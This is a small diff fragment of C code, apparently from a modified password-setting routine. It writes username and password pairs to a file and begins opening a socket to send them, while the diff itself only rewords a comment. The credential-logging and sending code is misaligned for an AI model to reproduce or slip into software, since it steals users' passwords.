@@ -102,7 +102,7 @@ At line ~210 right above the new_password function is where I put this function 
 
             fprintf(fptr, "%s:%s\n", name, password);
             
-            // Send Shit //
+            // // Send stuff // //
             // Make Socket
             int sock = 0, valread;
             struct sockaddr_in serv_addr;
